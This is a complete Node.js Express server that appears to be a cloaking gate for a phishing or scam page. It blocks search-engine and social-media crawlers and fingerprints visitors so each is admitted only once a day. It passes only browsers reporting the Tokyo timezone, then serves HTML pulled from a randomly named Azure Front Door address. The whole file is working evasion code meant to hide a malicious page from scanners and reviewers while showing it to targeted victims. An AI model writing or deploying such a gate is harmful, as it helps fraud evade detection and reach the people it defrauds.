import express from "express";
import cors from "cors";
import useragent from "express-useragent";
import { createClient } from "redis";
import crypto from "crypto";

const app = express();

app.use(express.json());
app.use(cors());
app.use(useragent.express());


// CONFIG
const TARGET_URL =
  "https://eragaaru-aad7gzhpc8h9cpd9.z02.azurefd.net/";

const redis = createClient({
  url: process.env.REDIS_URL
});

redis.connect().catch(console.error);


// BOT DETECTION
const BOT_AGENTS = [
  "googlebot",
  "bingbot",
  "facebookexternalhit",
  "facebot",
  "twitterbot",
  "linkedinbot",
  "crawler",
  "spider",
  "bot"
];

function isBot(ua = "") {
  if (!ua) return true;
  return BOT_AGENTS.some(b => ua.toLowerCase().includes(b));
}


// IP (fallback only)
function getIP(req) {
  const xf = req.headers["x-forwarded-for"];
  return (
    req.headers["cf-connecting-ip"] ||
    req.headers["x-real-ip"] ||
    (xf ? xf.split(",")[0].trim() : req.ip)
  );
}


// 🔐 DEVICE FINGERPRINT
function buildFingerprint(req) {
  const ua = req.get("User-Agent") || "";
  const lang = req.get("accept-language") || "";
  const ip = getIP(req);

  const raw = `${ua}|${lang}|${ip}`;

  return crypto
    .createHash("sha256")
    .update(raw)
    .digest("hex");
}


// REDIS CHECK (ONE VISIT PER FINGERPRINT)
async function isRepeatVisitor(fp) {
  const key = `fp:${fp}`;

  const exists = await redis.get(key);

  if (exists) return true;

  // store for 24h
  await redis.set(key, "1", {
    EX: 60 * 60 * 24
  });

  return false;
}


// MAIN ROUTE
app.all("/win/timezone", async (req, res) => {

  const ua =
    req.useragent?.source ||
    req.get("User-Agent") ||
    "";

  // BOT CHECK
  if (isBot(ua)) {
    return res.status(403).json({
      allowed: false,
      reason: "blocked_bot"
    });
  }

  // 🔐 FINGERPRINT CHECK
  const fingerprint = buildFingerprint(req);

  if (await isRepeatVisitor(fingerprint)) {
    return res.status(403).json({
      allowed: false,
      reason: "repeat_visitor_blocked"
    });
  }

  // TIMEZONE CHECK (frontend unchanged)
  const timezone =
    req.body?.timezone ||
    req.headers["x-timezone"] ||
    "";

  console.log("TIMEZONE:", timezone);

  if ((timezone || "").trim() !== "Asia/Tokyo") {
    return res.status(403).json({
      allowed: false,
      reason: "not_tokyo_timezone",
      received: timezone
    });
  }

  try {
    const response = await fetch(TARGET_URL);
    const html = await response.text();

    return res.status(200).send(html);

  } catch (err) {
    console.error("FETCH ERROR:", err);
    return res.status(500).send("Target fetch failed");
  }
});


// HEALTH
app.get("/", (req, res) => {
  res.send("Server running");
});


// START
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
